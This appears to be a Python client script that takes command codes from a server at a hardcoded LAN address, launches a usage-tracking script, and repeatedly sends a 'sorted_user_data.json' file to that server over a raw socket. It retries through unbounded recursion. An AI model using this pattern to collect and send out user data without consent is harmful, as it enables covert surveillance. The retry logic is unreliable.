import threading
import time
import json
import subprocess
import socket
import os


test = True
end = True
data_config = ''
client_socket = ''



def track_program_usage(file_name):
    try:
        file_path = os.path.join(os.getcwd(), file_name)
        subprocess.Popen(["python", file_path], shell=True)
        if test:
            print(f"Python file '{file_name}' started successfully.")
    except Exception as e:
        if test:
            print(f"Error occurred while starting Python file: {e}")




def client():

    def sending(file_name2):
        try:
            global test  # Assuming 'test' is a global variable
            print("TRY sending")
            # Construct the full file path using the provided file name
            file_path = os.path.join(os.getcwd(), file_name2)

            # Check if the file exists, create it if it doesn't
            if not os.path.exists(file_path):
                with open(file_path, 'w') as file:
                    file.write("")  # Write an empty string to create the file

            with open(file_path, 'rb') as file:
                data = file.read()

                host = "192.168.1.106"
                port = 21041
                sc = socket.socket()
                sc.connect((host, port))
                sc.send(data)
                sc.close()

                if test:
                    print("File sent successfully.")

                    # Add a delay before attempting to send the file again
                    time.sleep(5)  # Adjust the delay time as needed

                    # Recursive call to send the file again if needed
                    sending(file_name2)

        except Exception as e:
            if test:
                print(f"Error in sending data: {e}")
                sending(file_name2)  # Recursive call to handle errors and retry sending

    def configure():
        try:
            host = "192.168.1.106"
            port = 21043

            s = socket.socket()
            s.connect((host, port))
            config = '200'
            s.send(str(config).encode('utf-8'))
            time.sleep(1)

            data = s.recv(1024)
            data_str = data.decode('utf-8')
            if test:
                print("Received data:", data_str)

            global data_config
            data_config = data_str
            runner(s)
        except Exception as e:
            if test:
                print(f"Error in configuring client: {e}")

    def runner(s):
        global data_config


        if test:
            print("Runner started")
            time.sleep(1)

        if data_config == '400':
            time.sleep(1)
            end = False
            if test:
                print("Received 400: End set to False")
        elif data_config == '300':
            time.sleep(1)
            confirmation_message = '350'
            s.send(str(confirmation_message).encode('utf-8'))
            end = True
            if test:
                print("Received 300: End set to True")
        elif data_config == '200':
            time.sleep(1)
            track_program_usage('user.py')
            confirmation_message = '200'
            s.send(str(confirmation_message).encode('utf-8'))
            sending("sorted_user_data.json")
            if test:
                print("Received 200")
        elif data_config == '350':
            time.sleep(1)
            track_program_usage('user.py')
            confirmation_message = '350'
            s.send(str(confirmation_message).encode('utf-8'))
            if test:
                print("Received 350: Started tracking program usage")
        else:
            print("Invalid value received")
    configure()



if end:
    client()
else:
    if test:
        print("ABORT 400")